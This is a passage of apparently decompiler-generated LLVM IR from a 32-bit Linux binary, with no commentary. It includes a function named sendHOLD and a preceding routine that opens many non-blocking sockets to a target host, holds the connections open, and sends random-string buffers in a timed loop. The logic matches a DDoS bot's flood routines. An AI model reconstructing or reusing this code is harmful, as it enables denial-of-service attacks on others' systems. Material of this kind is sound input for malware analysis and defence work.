  store i32 4, i32* %v2_804c003, align 4
  %v1_804c005 = add i32 %v0_804bfd3, 4
  %v2_804c005 = inttoptr i32 %v1_804c005 to i32*
  store i32 1, i32* %v2_804c005, align 4
  %v0_804c007 = load i32, i32* %edx.global-to-local, align 4
  %v3_804c007 = inttoptr i32 %v0_804bfd3 to i32*
  store i32 %v0_804c007, i32* %v3_804c007, align 4
  %v0_804c008 = load i32, i32* %stack_var_-200, align 4
  %v1_804c008 = load i32, i32* %stack_var_-196, align 4
  %v3_804c008 = load i32, i32* %stack_var_-188, align 4
  %v5_804c008 = call i32 @getsockopt(i32 %v0_804c008, i32 %v1_804c008, i32 10000, i32 %v3_804c008, i32 ptrtoint (i32* @0 to i32))
  %v0_804c00d = load i32, i32* @esp, align 4
  %v3_804c010 = load i32, i32* %stack_var_-204, align 4
  %v1_804c016 = icmp eq i32 %v3_804c010, 0
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  br i1 %v1_804c016, label %dec_label_pc_804c03f, label %dec_label_pc_804c01a

dec_label_pc_804c01a:                             ; preds = %dec_label_pc_804bfdf
  %v5_804c020 = load i32, i32* %v4_804bf7c, align 8
  store i32 %v5_804c020, i32* %eax.global-to-local, align 4
  %v2_804c026 = add i32 %v0_804c00d, 16
  %v3_804c026 = inttoptr i32 %v2_804c026 to i32*
  store i32 %v5_804c020, i32* %v3_804c026, align 4
  %v0_804c027 = load i32, i32* %stack_var_-200, align 4
  %v1_804c027 = call i32 @__libc_close(i32 %v0_804c027)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804be7c, align 4
  br label %dec_label_pc_804c0db

dec_label_pc_804c03f:                             ; preds = %dec_label_pc_804bfdf
  store i8 2, i8* %v5_804be7c, align 4
  br label %dec_label_pc_804c0db

dec_label_pc_804c04f:                             ; preds = %dec_label_pc_804bf5d
  %v13_804c04f = icmp eq i32 %v5_804bfce, -1
  %v1_804c053 = icmp eq i1 %v13_804c04f, false
  br i1 %v1_804c053, label %dec_label_pc_804c0db, label %dec_label_pc_804c059

dec_label_pc_804c059:                             ; preds = %dec_label_pc_804c04f
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v5_804c05f = load i32, i32* %v4_804bf7c, align 8
  store i32 %v5_804c05f, i32* %eax.global-to-local, align 4
  %v2_804c065 = add i32 %v0_804bfd3, 16
  %v3_804c065 = inttoptr i32 %v2_804c065 to i32*
  store i32 %v5_804c05f, i32* %v3_804c065, align 4
  %v1_804c066 = call i32 @__libc_close(i32 %v5_804bfce)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804be7c, align 4
  br label %dec_label_pc_804c0db

dec_label_pc_804c07b:                             ; preds = %dec_label_pc_804be9a
  %v0_804c07b = load i32, i32* @esp, align 4
  %v1_804c07b = add i32 %v0_804c07b, -4
  %v2_804c07b = inttoptr i32 %v1_804c07b to i32*
  store i32 1024, i32* %v2_804c07b, align 4
  %v5_804c080 = add i32 %v0_804c07b, -8
  %v6_804c080 = inttoptr i32 %v5_804c080 to i32*
  store i32 %v1_804be2e, i32* %v6_804c080, align 4
  %v2_804c083 = inttoptr i32 %v7_804be7c to i8*
  %v3_804c083 = call i32 @makeRandomStr(i8* %v2_804c083, i32 %v12_804bd67)
  %v0_804c088 = load i32, i32* @esp, align 4
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v3_804c091 = add i32 %v2_804be7c, %v2_804bdfa
  %v4_804c091 = inttoptr i32 %v3_804c091 to i32*
  %v5_804c091 = load i32, i32* %v4_804c091, align 8
  store i32 %v5_804c091, i32* %eax.global-to-local, align 4
  %v1_804c094 = add i32 %v0_804c088, 4
  %v2_804c094 = inttoptr i32 %v1_804c094 to i32*
  store i32 16384, i32* %v2_804c094, align 4
  %v2_804c099 = inttoptr i32 %v0_804c088 to i32*
  store i32 1024, i32* %v2_804c099, align 4
  %v5_804c09e = add i32 %v0_804c088, -4
  %v6_804c09e = inttoptr i32 %v5_804c09e to i32*
  store i32 %v1_804be2e, i32* %v6_804c09e, align 4
  %v0_804c0a1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c0a1 = add i32 %v0_804c088, -8
  %v3_804c0a1 = inttoptr i32 %v2_804c0a1 to i32*
  store i32 %v0_804c0a1, i32* %v3_804c0a1, align 4
  %v0_804c0a2 = load i32, i32* %stack_var_-200, align 4
  %v1_804c0a2 = load i32, i32* %stack_var_-196, align 4
  %v3_804c0a2 = load i32, i32* %stack_var_-188, align 4
  %v4_804c0a2 = call i32 @__libc_send(i32 %v0_804c0a2, i32 %v1_804c0a2, i32 %stack_var_-192.139, i32 %v3_804c0a2)
  store i32 %v4_804c0a2, i32* %eax.global-to-local, align 4
  %v10_804c0aa = icmp eq i32 %v4_804c0a2, -1
  %v1_804c0ad = icmp eq i1 %v10_804c0aa, false
  br i1 %v1_804c0ad, label %dec_label_pc_804c0db, label %dec_label_pc_804c0af

dec_label_pc_804c0af:                             ; preds = %dec_label_pc_804c07b
  %v0_804c0af = load i32, i32* %stack_var_-200, align 4
  %v1_804c0af = call i32 @__errno_location(i32 %v0_804c0af)
  store i32 %v1_804c0af, i32* %eax.global-to-local, align 4
  %v1_804c0b4 = inttoptr i32 %v1_804c0af to i32*
  %v2_804c0b4 = load i32, i32* %v1_804c0b4, align 4
  store i32 %v2_804c0b4, i32* %eax.global-to-local, align 4
  %v9_804c0b6 = icmp eq i32 %v2_804c0b4, 11
  br i1 %v9_804c0b6, label %dec_label_pc_804c0db, label %dec_label_pc_804c0bb

dec_label_pc_804c0bb:                             ; preds = %dec_label_pc_804c0af
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  %v5_804c0c1 = load i32, i32* %v4_804c091, align 8
  store i32 %v5_804c0c1, i32* %eax.global-to-local, align 4
  %v0_804c0c4 = load i32, i32* @esp, align 4
  %v2_804c0c7 = add i32 %v0_804c0c4, -16
  %v3_804c0c7 = inttoptr i32 %v2_804c0c7 to i32*
  store i32 %v5_804c0c1, i32* %v3_804c0c7, align 4
  %v0_804c0c8 = load i32, i32* %stack_var_-200, align 4
  %v1_804c0c8 = call i32 @__libc_close(i32 %v0_804c0c8)
  store i32 %storemerge40, i32* %edx.global-to-local, align 4
  store i32 %v2_804bdfa, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804be7c, align 4
  br label %dec_label_pc_804c0db

dec_label_pc_804c0db:                             ; preds = %dec_label_pc_804bea7, %dec_label_pc_804c0af, %dec_label_pc_804c07b, %dec_label_pc_804c04f, %dec_label_pc_804c059, %dec_label_pc_804c03f, %dec_label_pc_804c01a, %dec_label_pc_804bf4d, %dec_label_pc_804bf33, %dec_label_pc_804c0bb
  %stack_var_-192.0 = phi i32 [ 10000, %dec_label_pc_804c04f ], [ 10000, %dec_label_pc_804c059 ], [ 10000, %dec_label_pc_804c03f ], [ 10000, %dec_label_pc_804c01a ], [ %stack_var_-192.139, %dec_label_pc_804c07b ], [ %stack_var_-192.139, %dec_label_pc_804c0af ], [ %stack_var_-192.139, %dec_label_pc_804c0bb ], [ %stack_var_-192.139, %dec_label_pc_804bf33 ], [ %stack_var_-192.139, %dec_label_pc_804bf4d ], [ %stack_var_-192.139, %dec_label_pc_804bea7 ]
  %v4_804c0db = add nuw nsw i32 %storemerge40, 1
  store i32 %v4_804c0db, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804c0db, %v2_804bd83
  br i1 %exitcond, label %dec_label_pc_804c0de.dec_label_pc_804c0ea.loopexit_crit_edge, label %dec_label_pc_804be76

dec_label_pc_804c0de.dec_label_pc_804c0ea.loopexit_crit_edge: ; preds = %dec_label_pc_804c0db
  %v0_804c0ea.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c0ea

dec_label_pc_804c0ea:                             ; preds = %dec_label_pc_804c0de.preheader, %dec_label_pc_804c0de.dec_label_pc_804c0ea.loopexit_crit_edge, %dec_label_pc_804bdc4
  %v0_804c0ea = phi i32 [ %v1_804be5c, %dec_label_pc_804bdc4 ], [ %v0_804c0ea.pre.pre, %dec_label_pc_804c0de.dec_label_pc_804c0ea.loopexit_crit_edge ], [ %v1_804c0f4, %dec_label_pc_804c0de.preheader ]
  %stack_var_-192.2 = phi i32 [ %tmp4, %dec_label_pc_804bdc4 ], [ %stack_var_-192.0, %dec_label_pc_804c0de.dec_label_pc_804c0ea.loopexit_crit_edge ], [ %stack_var_-192.2, %dec_label_pc_804c0de.preheader ]
  %stack_var_-36.0 = phi i32 [ %tmp8, %dec_label_pc_804bdc4 ], [ %v2_804bd83, %dec_label_pc_804c0de.dec_label_pc_804c0ea.loopexit_crit_edge ], [ 0, %dec_label_pc_804c0de.preheader ]
  %v1_804c0ed = add i32 %v0_804c0ea, -16
  %v2_804c0ed = inttoptr i32 %v1_804c0ed to i32*
  store i32 0, i32* %v2_804c0ed, align 4
  %v1_804c0ef = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_804c0ef = call i32 @__GI_time(i32* %v1_804c0ef)
  store i32 %v2_804c0ef, i32* %eax.global-to-local, align 4
  %v5_804c0fa = icmp slt i32 %v2_804c0ef, %v5_804be5f
  br i1 %v5_804c0fa, label %dec_label_pc_804c0de.preheader, label %dec_label_pc_804c100

dec_label_pc_804c0de.preheader:                   ; preds = %dec_label_pc_804c0ea
  %v0_804c0f4 = load i32, i32* @esp, align 4
  %v1_804c0f4 = add i32 %v0_804c0f4, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804c0e438, label %dec_label_pc_804be76, label %dec_label_pc_804c0ea

dec_label_pc_804c100:                             ; preds = %dec_label_pc_804c0ea, %entry
  %v0_804c10c = phi i32 [ %v3_804bdb3, %entry ], [ %v2_804c0ef, %dec_label_pc_804c0ea ]
  %v2_804c109 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c109, i32* @ebx, align 4
  store i32 %v0_804bd65, i32* @edi, align 4
  ret i32 %v0_804c10c

; uselistorder directives
  uselistorder i32 %v4_804c0db, { 1, 2, 0 }
  uselistorder i32 %stack_var_-192.0, { 1, 0 }
  uselistorder i32 %v0_804c088, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804bfd3, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_804bfce, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804bf8d, { 1, 0 }
  uselistorder i32* %v4_804bf7c, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_804bee7, { 2, 0, 1 }
  uselistorder i32 %v7_804be7c, { 7, 2, 1, 3, 4, 5, 6, 8, 0 }
  uselistorder i8* %v5_804be7c, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-192.139, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge40, { 0, 13, 12, 11, 7, 6, 10, 9, 8, 5, 4, 3, 19, 18, 17, 16, 15, 14, 20, 1, 2 }
  uselistorder i32 %v2_804be17, { 1, 0 }
  uselistorder i32 %v2_804bdfa, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 4, 5 }
  uselistorder i32 %v1_804bd91, { 1, 0 }
  uselistorder i32 %v2_804bd83, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804bd75, { 1, 0, 2 }
  uselistorder i32 %v12_804bd67, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-200, { 4, 2, 0, 3, 1, 5, 6 }
  uselistorder i32* %stack_var_-204, { 4, 1, 3, 2, 0, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 52, 43, 42, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 6, 12, 11, 10, 9, 8, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804c0db, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804c110 = load i32, i32* @edi, align 4
  %v0_804c111 = load i32, i32* @ebx, align 4
  store i32 %v0_804c111, i32* %stack_var_-12, align 4
  %v12_804c112 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_804c112, i32* %eax.global-to-local, align 4
  %v1_804c120 = call i32 @getdtablesize(i32 %v12_804c112)
  store i32 %v1_804c120, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804c120, 0
  %v2_804c129 = zext i1 %tmp to i32
  %v2_804c12c = add i32 %v2_804c129, %v1_804c120
  %v2_804c12e = sdiv i32 %v2_804c12c, 2
  store i32 2, i32* %stack_var_-68, align 4
  %v1_804c13c = urem i32 %arg2, 65536
  store i32 %v1_804c13c, i32* %eax.global-to-local, align 4
  %v1_804c145 = call i32 @htons(i32 %v1_804c13c)
  %v2_804c154 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804c157 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804c157, i32* %eax.global-to-local, align 4
  %v3_804c15e = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804c15e, i32* %eax.global-to-local, align 4
  %v1_804c166 = icmp eq i32 %v3_804c15e, 0
  br i1 %v1_804c166, label %dec_label_pc_804c16f, label %dec_label_pc_804c4f0

dec_label_pc_804c16f:                             ; preds = %entry
  %v2_804c185 = mul i32 %v2_804c12e, 8
  %v1_804c18b = add i32 %v2_804c185, 30
  %v2_804c18e = and i32 %v1_804c18b, -16
  %v2_804c194 = sub i32 %v12_804c112, %v2_804c18e
  %v1_804c1a2 = add i32 %v2_804c194, 15
  %v2_804c1a5 = and i32 %v1_804c1a2, -16
  %v2_804c1c2 = mul i32 %v2_804c12e, 5
  store i32 %v2_804c1c2, i32* %edx.global-to-local, align 4
  %v1_804c1c8 = inttoptr i32 %v2_804c1a5 to i8*
  store i32 %v2_804c1a5, i32* @edi, align 4
  %v1_804c1cd = and i32 %v1_804c1a2, -256
  store i32 %v1_804c1cd, i32* %eax.global-to-local, align 4
  %v5_804c1cf = call i8* @_memset(i8* %v1_804c1c8, i32 %v1_804c1cd, i32 %v2_804c1c2)
  %v0_804c1d1 = load i32, i32* @esp, align 4
  %v1_804c1d4 = add i32 %v0_804c1d1, -16
  %v2_804c1d4 = inttoptr i32 %v1_804c1d4 to i32*
  store i32 1024, i32* %v2_804c1d4, align 4
  %v1_804c1d9 = call i32 @malloc(i32 %v2_804c1a5)
  %v0_804c1de = load i32, i32* @esp, align 4
  store i32 %v1_804c1d9, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804c1f1 = add i32 %v0_804c1de, 8
  %v3_804c1f1 = inttoptr i32 %v2_804c1f1 to i32*
  store i32 1024, i32* %v3_804c1f1, align 4
  %v1_804c1f2 = add i32 %v0_804c1de, 4
  %v2_804c1f2 = inttoptr i32 %v1_804c1f2 to i32*
  store i32 0, i32* %v2_804c1f2, align 4
  %v0_804c1f4 = load i32, i32* %edx.global-to-local, align 4
  %v3_804c1f4 = inttoptr i32 %v0_804c1de to i32*
  store i32 %v0_804c1f4, i32* %v3_804c1f4, align 4
  %v3_804c1f5 = inttoptr i32 %v1_804c1d9 to i8*
  %v4_804c1f5 = call i32 @__GI_memset(i8* %v3_804c1f5, i32 %tmp11, i32 %tmp8)
  store i32 %v4_804c1f5, i32* %eax.global-to-local, align 4
  %v0_804c1fa = load i32, i32* @esp, align 4
  %v2_804c200 = inttoptr i32 %v0_804c1fa to i32*
  store i32 0, i32* %v2_804c200, align 4
  %v1_804c202 = inttoptr i32 %v1_804c1d9 to i32*
  %v2_804c202 = call i32 @__GI_time(i32* %v1_804c202)
  %v0_804c207 = load i32, i32* @esp, align 4
  %v1_804c207 = add i32 %v0_804c207, 16
  %v5_804c20a = add i32 %v2_804c202, %arg3
  store i32 %v5_804c20a, i32* %eax.global-to-local, align 4
  %v3_804c227 = or i32 %v2_804c1a5, 4
  %v2_804c312 = ptrtoint i32* %stack_var_-196 to i32
  %tmp37 = bitcast i32* %stack_var_-196 to i8*
  %v2_804c366 = ptrtoint i32* %stack_var_-204 to i32
  %v2_804c3a0 = ptrtoint i32* %stack_var_-208 to i32
  %v2_804c3a7 = ptrtoint i32* %stack_var_-212 to i32
  %v5_804c4d440 = icmp sgt i32 %v2_804c12c, 1
  br label %dec_label_pc_804c4da

dec_label_pc_804c221:                             ; preds = %dec_label_pc_804c4ce.preheader, %dec_label_pc_804c4cb
  %storemerge41 = phi i32 [ %v4_804c4cb, %dec_label_pc_804c4cb ], [ 0, %dec_label_pc_804c4ce.preheader ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %edx.global-to-local, align 4
  %v2_804c227 = mul i32 %storemerge41, 8
  %v4_804c227 = add i32 %v2_804c227, %v3_804c227
  %v5_804c227 = inttoptr i32 %v4_804c227 to i8*
  %v6_804c227 = load i8, i8* %v5_804c227, align 4
  %v7_804c227 = zext i8 %v6_804c227 to i32
  %v9_804c227 = and i32 %storemerge41, -256
  %v10_804c227 = or i32 %v7_804c227, %v9_804c227
  store i32 %v10_804c227, i32* %eax.global-to-local, align 4
  store i32 %v7_804c227, i32* %edx.global-to-local, align 4
  %v8_804c238 = icmp eq i8 %v6_804c227, 0
  %v12_804c238 = icmp eq i8 %v6_804c227, 1
  br i1 %v12_804c238, label %dec_label_pc_804c308, label %dec_label_pc_804c245

dec_label_pc_804c245:                             ; preds = %dec_label_pc_804c221
  %v12_804c245 = icmp eq i8 %v6_804c227, 2
  br i1 %v12_804c245, label %dec_label_pc_804c429, label %dec_label_pc_804c252

dec_label_pc_804c252:                             ; preds = %dec_label_pc_804c245
  br i1 %v8_804c238, label %dec_label_pc_804c260, label %dec_label_pc_804c4cb

dec_label_pc_804c260:                             ; preds = %dec_label_pc_804c252
  store i32 %storemerge41, i32* @ebx, align 4
  %v0_804c263 = load i32, i32* @esp, align 4
  %v1_804c266 = add i32 %v0_804c263, -8
  %v2_804c266 = inttoptr i32 %v1_804c266 to i32*
  store i32 0, i32* %v2_804c266, align 4
  %v1_804c268 = add i32 %v0_804c263, -12
  %v2_804c268 = inttoptr i32 %v1_804c268 to i32*
  store i32 1, i32* %v2_804c268, align 4
  %v1_804c26a = add i32 %v0_804c263, -16
  %v2_804c26a = inttoptr i32 %v1_804c26a to i32*
  store i32 2, i32* %v2_804c26a, align 4
  %v3_804c26c = call i32 @socket(i32 %v7_804c227, i32 %v12_804c112, i32 ptrtoint (i32* @0 to i32))
  %v2_804c279 = load i32, i32* @ebx, align 4
  %v3_804c279 = mul i32 %v2_804c279, 8
  %v4_804c279 = add i32 %v3_804c279, %v2_804c1a5
  %v5_804c279 = inttoptr i32 %v4_804c279 to i32*
  store i32 %v3_804c26c, i32* %v5_804c279, align 8
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v3_804c282 = add i32 %v2_804c227, %v2_804c1a5
  %v4_804c282 = inttoptr i32 %v3_804c282 to i32*
  %v5_804c282 = load i32, i32* %v4_804c282, align 8
  store i32 %v5_804c282, i32* %eax.global-to-local, align 4
  %v0_804c285 = load i32, i32* @esp, align 4
  %v1_804c288 = add i32 %v0_804c285, -8
  %v2_804c288 = inttoptr i32 %v1_804c288 to i32*
  store i32 0, i32* %v2_804c288, align 4
  %v1_804c28a = add i32 %v0_804c285, -12
  %v2_804c28a = inttoptr i32 %v1_804c28a to i32*
  store i32 3, i32* %v2_804c28a, align 4
  %v0_804c28c = load i32, i32* %eax.global-to-local, align 4
  %v2_804c28c = add i32 %v0_804c285, -16
  %v3_804c28c = inttoptr i32 %v2_804c28c to i32*
  store i32 %v0_804c28c, i32* %v3_804c28c, align 4
  %v3_804c28d = call i32 @__libc_fcntl(i32 %v7_804c227, i32 %v12_804c112, i32 ptrtoint (i32* @0 to i32))
  %v0_804c292 = load i32, i32* @esp, align 4
  %v12_804c297 = or i32 %v3_804c28d, 2048
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c2a0 = load i32, i32* %v4_804c282, align 8
  store i32 %v5_804c2a0, i32* %eax.global-to-local, align 4
  %v2_804c2a6 = add i32 %v0_804c292, 8
  %v3_804c2a6 = inttoptr i32 %v2_804c2a6 to i32*
  store i32 %v12_804c297, i32* %v3_804c2a6, align 4
  %v1_804c2a7 = add i32 %v0_804c292, 4
  %v2_804c2a7 = inttoptr i32 %v1_804c2a7 to i32*
  store i32 4, i32* %v2_804c2a7, align 4
  %v0_804c2a9 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c2a9 = inttoptr i32 %v0_804c292 to i32*
  store i32 %v0_804c2a9, i32* %v3_804c2a9, align 4
  %v3_804c2aa = call i32 @__libc_fcntl(i32 %v7_804c227, i32 %v12_804c112, i32 ptrtoint (i32* @0 to i32))
  %v0_804c2af = load i32, i32* @esp, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c2bb = load i32, i32* %v4_804c282, align 8
  store i32 %v5_804c2bb, i32* %eax.global-to-local, align 4
  %v1_804c2c1 = add i32 %v0_804c2af, 8
  %v2_804c2c1 = inttoptr i32 %v1_804c2c1 to i32*
  store i32 16, i32* %v2_804c2c1, align 4
  %v2_804c2c3 = add i32 %v0_804c2af, 4
  %v3_804c2c3 = inttoptr i32 %v2_804c2c3 to i32*
  store i32 %v2_804c154, i32* %v3_804c2c3, align 4
  %v0_804c2c4 = load i32, i32* %eax.global-to-local, align 4
  %v3_804c2c4 = inttoptr i32 %v0_804c2af to i32*
  store i32 %v0_804c2c4, i32* %v3_804c2c4, align 4
  %v3_804c2c5 = call i32 @__libc_connect(i32 %v7_804c227, i32 %v12_804c112, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c2c5, i32* %eax.global-to-local, align 4
  %v0_804c2ca = load i32, i32* @esp, align 4
  %v1_804c2ca = add i32 %v0_804c2ca, 16
  %v10_804c2cd = icmp eq i32 %v3_804c2c5, -1
  %v1_804c2d0 = icmp eq i1 %v10_804c2cd, false
  br i1 %v1_804c2d0, label %dec_label_pc_804c2de, label %dec_label_pc_804c2d2

dec_label_pc_804c2d2:                             ; preds = %dec_label_pc_804c260
  %v1_804c2d2 = call i32 @__errno_location(i32 %v7_804c227)
  store i32 %v1_804c2d2, i32* %eax.global-to-local, align 4
  %v1_804c2d7 = inttoptr i32 %v1_804c2d2 to i32*
  %v2_804c2d7 = load i32, i32* %v1_804c2d7, align 4
  store i32 %v2_804c2d7, i32* %eax.global-to-local, align 4
  %v9_804c2d9 = icmp eq i32 %v2_804c2d7, 115
  br i1 %v9_804c2d9, label %dec_label_pc_804c2f8, label %dec_label_pc_804c2d2.dec_label_pc_804c2de_crit_edge

dec_label_pc_804c2d2.dec_label_pc_804c2de_crit_edge: ; preds = %dec_label_pc_804c2d2
  %v0_804c2e7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c2de

dec_label_pc_804c2de:                             ; preds = %dec_label_pc_804c2d2.dec_label_pc_804c2de_crit_edge, %dec_label_pc_804c260
  %v0_804c2e7 = phi i32 [ %v0_804c2e7.pre, %dec_label_pc_804c2d2.dec_label_pc_804c2de_crit_edge ], [ %v1_804c2ca, %dec_label_pc_804c260 ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %edx.global-to-local, align 4
  %v5_804c2e4 = load i32, i32* %v4_804c282, align 8
  store i32 %v5_804c2e4, i32* %eax.global-to-local, align 4
  %v2_804c2ea = add i32 %v0_804c2e7, -16
  %v3_804c2ea = inttoptr i32 %v2_804c2ea to i32*
  store i32 %v5_804c2e4, i32* %v3_804c2ea, align 4
  %v1_804c2eb = call i32 @__libc_close(i32 %v7_804c227)
  store i32 %v1_804c2eb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c4cb

dec_label_pc_804c2f8:                             ; preds = %dec_label_pc_804c2d2
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804c227, align 4
  br label %dec_label_pc_804c4cb

dec_label_pc_804c308:                             ; preds = %dec_label_pc_804c221
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c312, i32* @edi, align 4
  %v5_804c319 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v3_804c327 = add i32 %v2_804c227, %v2_804c1a5
  %v4_804c327 = inttoptr i32 %v3_804c327 to i32*
  %v5_804c327 = load i32, i32* %v4_804c327, align 8
  %v2_804c32c = udiv i32 %v5_804c327, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c335 = load i32, i32* %v4_804c327, align 8
  %v1_804c338 = urem i32 %v5_804c335, 32
  store i32 %v1_804c338, i32* %eax.global-to-local, align 4
  %v0_804c33b = load i32, i32* @ebp, align 4
  %v2_804c33b = mul nuw nsw i32 %v2_804c32c, 4
  %v3_804c33b = add nsw i32 %v2_804c33b, -192
  %v4_804c33b = add i32 %v3_804c33b, %v0_804c33b
  %v5_804c33b = inttoptr i32 %v4_804c33b to i32*
  %v6_804c33b = load i32, i32* %v5_804c33b, align 4
  %v9_804c33b = shl i32 1, %v1_804c338
  %v12_804c33b = or i32 %v6_804c33b, %v9_804c33b
  store i32 %v12_804c33b, i32* %v5_804c33b, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c35d = load i32, i32* %v4_804c327, align 8
  %v1_804c360 = add i32 %v5_804c35d, 1
  store i32 %v1_804c360, i32* %edx.global-to-local, align 4
  %v0_804c363 = load i32, i32* @esp, align 4
  %v2_804c36c = add i32 %v0_804c363, -16
  %v3_804c36c = inttoptr i32 %v2_804c36c to i32*
  store i32 %v2_804c366, i32* %v3_804c36c, align 4
  %v1_804c36d = add i32 %v0_804c363, -20
  %v2_804c36d = inttoptr i32 %v1_804c36d to i32*
  store i32 0, i32* %v2_804c36d, align 4
  store i32 %v2_804c312, i32* %eax.global-to-local, align 4
  %v2_804c375 = add i32 %v0_804c363, -24
  %v3_804c375 = inttoptr i32 %v2_804c375 to i32*
  store i32 %v2_804c312, i32* %v3_804c375, align 4
  %v1_804c376 = add i32 %v0_804c363, -28
  %v2_804c376 = inttoptr i32 %v1_804c376 to i32*
  store i32 0, i32* %v2_804c376, align 4
  %v0_804c378 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c378 = add i32 %v0_804c363, -32
  %v3_804c378 = inttoptr i32 %v2_804c378 to i32*
  store i32 %v0_804c378, i32* %v3_804c378, align 4
  %v0_804c379 = load i32, i32* %stack_var_-204, align 4
  %v2_804c379 = load i32, i32* %stack_var_-196, align 4
  %v5_804c379 = call i32 @__libc_select(i32 %v0_804c379, i32 10000, i32 %v2_804c379, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c379, i32* %eax.global-to-local, align 4
  %v0_804c37e = load i32, i32* @esp, align 4
  %v12_804c384 = icmp eq i32 %v5_804c379, 1
  %v1_804c388 = icmp eq i1 %v12_804c384, false
  br i1 %v1_804c388, label %dec_label_pc_804c3fa, label %dec_label_pc_804c38a

dec_label_pc_804c38a:                             ; preds = %dec_label_pc_804c308
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1a5, i32* %eax.global-to-local, align 4
  %v5_804c39a = load i32, i32* %v4_804c327, align 8
  store i32 %v5_804c39a, i32* %edx.global-to-local, align 4
  %v2_804c3a6 = add i32 %v0_804c37e, 16
  %v3_804c3a6 = inttoptr i32 %v2_804c3a6 to i32*
